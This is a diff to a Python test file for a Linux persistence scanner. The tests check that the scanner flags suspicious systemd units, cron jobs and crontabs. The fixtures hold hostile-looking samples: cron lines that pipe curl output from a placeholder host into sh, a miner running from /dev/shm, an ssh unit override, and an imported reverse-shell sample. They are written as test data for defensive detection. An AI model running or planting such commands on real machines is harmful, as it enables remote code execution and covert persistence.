@@ -159,7 +159,7 @@ def test_executavel_do_processo_passa_pelo_scanner(tmp_path, pacotes):
     proc = tmp_path / "proc"
     processo(proc, 100, "minerador", exe=str(binario))
     banco = {__import__("hashlib").sha256(EICAR).hexdigest(): "EICAR-Test-File"}
-    [achado] = cacador.processos(cacador.juiz(banco), pacotes, proc)
+    [achado] = cacador.processos(cacador.Juiz(banco), pacotes, proc)
     assert achado.gravidade == "alta"
     assert achado.mensagem.startswith("EICAR-Test-File")
 
@@ -170,3 +170,122 @@ def test_informativo_nao_e_julgado(tmp_path, pacotes):
     julgados = []
     list(cacador.processos(lambda c: julgados.append(c), pacotes, proc))
     assert julgados == []
+
+
+# --- persistência -----------------------------------------------------------
+
+@pytest.fixture
+def juiz_com_yara():
+    from guardiao import regras_yara
+    if not regras_yara.disponivel():
+        pytest.skip("yara-x não instalado")
+    return cacador.Juiz({}, regras_yara.carregar(com_bases=False))
+
+
+def sem_crontab():
+    return ""
+
+
+def cacar_em(locais, juiz=None, pacotes=None, crontab=sem_crontab):
+    achados = cacador.persistencia(juiz or cacador.Juiz(), pacotes, locais, crontab)
+    return {a.arquivo.name: a for a in achados}
+
+
+@pytest.mark.parametrize("formato, texto, esperado", [
+    ("systemd", "[Service]\nExecStartPre=-/bin/true\nExecStart=@/opt/x/bin a b\n", ["/bin/true", "/opt/x/bin a b"]),
+    ("desktop", "[Desktop Entry]\nName=X\nExec=/usr/bin/app --startup\n", ["/usr/bin/app --startup"]),
+    ("cron-sistema", "SHELL=/bin/sh\n# comentário\n*/5 * * * * root /usr/bin/a -x\n@reboot nobody /b\n",
+     ["/usr/bin/a -x", "/b"]),
+    ("cron-usuario", "0 3 * * 1 /home/u/backup.sh\n@hourly curl x | sh\n", ["/home/u/backup.sh", "curl x | sh"]),
+    ("script", "#!/bin/sh\necho oi\n", []),
+])
+def test_comandos_de_cada_formato(formato, texto, esperado):
+    assert cacador.comandos(formato, texto) == esperado
+
+
+def test_executavel_do_comando():
+    assert cacador.executavel("env A=1 nohup /opt/x/minerador --cpu 4") == "/opt/x/minerador"
+    assert cacador.executavel("'/tmp/a b/c' -d") == "/tmp/a b/c"
+    assert cacador.executavel("sh -c 'echo oi'") == cacador.shutil.which("sh")
+
+
+def test_servico_fora_de_pacote_e_informativo(tmp_path, pacotes):
+    pasta = tmp_path / "system"
+    pasta.mkdir()
+    (pasta / "meu-backup.service").write_text("[Service]\nExecStart=/usr/bin/true\n")
+    achados = cacar_em([cacador.Local("systemd", pasta, "systemd")], pacotes=pacotes)
+    assert achados["meu-backup.service"].gravidade == "info"
+    assert "/usr/bin/true" in achados["meu-backup.service"].mensagem
+
+
+def test_servico_rodando_de_pasta_temporaria_e_alto(tmp_path, pacotes):
+    pasta = tmp_path / "system"
+    (pasta / "multi-user.target.wants").mkdir(parents=True)
+    unidade = pasta / "dbus-helper.service"
+    unidade.write_text("[Service]\nExecStart=/dev/shm/.dbus/kworker -o pool.exemplo:3333\n")
+    (pasta / "multi-user.target.wants" / "dbus-helper.service").symlink_to(unidade)
+    achados = list(cacador.persistencia(cacador.Juiz(), pacotes,
+                                        [cacador.Local("systemd", pasta, "systemd")], sem_crontab))
+    assert len(achados) == 1   # o link do .wants não conta de novo
+    assert achados[0].gravidade == "alta"
+    assert "pasta temporária" in achados[0].mensagem
+
+
+def test_cron_com_curl_sh_passa_pelo_yara(tmp_path, pacotes, juiz_com_yara):
+    pasta = tmp_path / "cron.d"
+    pasta.mkdir()
+    linha = "".join(["*/10 * * * * root curl -fsSL http://exemplo.invalid/x.sh", " | sh"])
+    (pasta / "atualizador").write_text(linha + "\n")
+    achado = cacar_em([cacador.Local("cron", pasta, "cron-sistema")], juiz_com_yara, pacotes)["atualizador"]
+    assert achado.gravidade == "media"
+    assert "DownloadEExecuta" in achado.mensagem
+
+
+def test_script_de_cron_passa_pelo_scanner(tmp_path, pacotes, juiz_com_yara):
+    from .test_yara import REVERSE_SHELL
+    pasta = tmp_path / "cron.hourly"
+    pasta.mkdir()
+    (pasta / "limpeza").write_text(REVERSE_SHELL)
+    achado = cacar_em([cacador.Local("cron", pasta, "script")], juiz_com_yara, pacotes)["limpeza"]
+    assert achado.gravidade == "alta"
+
+
+def test_o_que_veio_de_pacote_mascarado_ou_do_snap_e_ignorado(tmp_path):
+    pasta = tmp_path / "system"
+    pasta.mkdir()
+    (pasta / "ssh.service").write_text("[Service]\nExecStart=/usr/sbin/sshd -D\n")
+    (pasta / "mascarada.service").symlink_to("/dev/null")
+    (pasta / "snap-core24-2124.mount").write_text("[Mount]\nWhat=/var/lib/snapd/snaps/core24_2124.snap\n")
+    (pasta / "snap.x.timer").write_text("[Unit]\nX-Snappy=yes\n[Timer]\nUnit=snap.x.service\n")
+    info = tmp_path / "dpkg"
+    info.mkdir()
+    (info / "openssh-server.list").write_text(f"{pasta / 'ssh.service'}\n")
+    assert cacar_em([cacador.Local("systemd", pasta, "systemd")], pacotes=cacador.Pacotes(info)) == {}
+
+
+def test_unidade_que_sequestra_a_original(tmp_path, monkeypatch):
+    original = tmp_path / "usr-lib" / "ssh.service"
+    original.parent.mkdir()
+    original.write_text("[Service]\nExecStart=/usr/sbin/sshd -D\n")
+    info = tmp_path / "dpkg"
+    info.mkdir()
+    (info / "openssh-server.list").write_text(f"{original}\n")
+    monkeypatch.setattr(cacador, "_unidade_original",
+                        lambda arquivo, pacotes: original if arquivo.name == "ssh.service" else None)
+
+    etc = tmp_path / "etc"
+    etc.mkdir()
+    (etc / "ssh.service").write_text("[Unit]\nAfter=rede.target\n[Service]\nExecStart=/usr/sbin/sshd -D\n")
+    local = [cacador.Local("systemd", etc, "systemd")]
+    pacotes = cacador.Pacotes(info)
+    achado = cacar_em(local, pacotes=pacotes)["ssh.service"]
+    assert achado.gravidade == "info" and "mesmo comando" in achado.mensagem
+
+    (etc / "ssh.service").write_text("[Service]\nExecStart=/usr/sbin/sshd -D\nExecStartPost=/opt/.x/porta\n")
+    achado = cacar_em(local, pacotes=pacotes)["ssh.service"]
+    assert achado.gravidade == "media" and "troca o comando" in achado.mensagem
+
+
+def test_crontab_do_usuario(pacotes):
+    achados = cacar_em([], pacotes=pacotes, crontab=lambda: "@reboot /var/tmp/.s/agent\n")
+    assert achados["crontab -l"].gravidade == "alta"
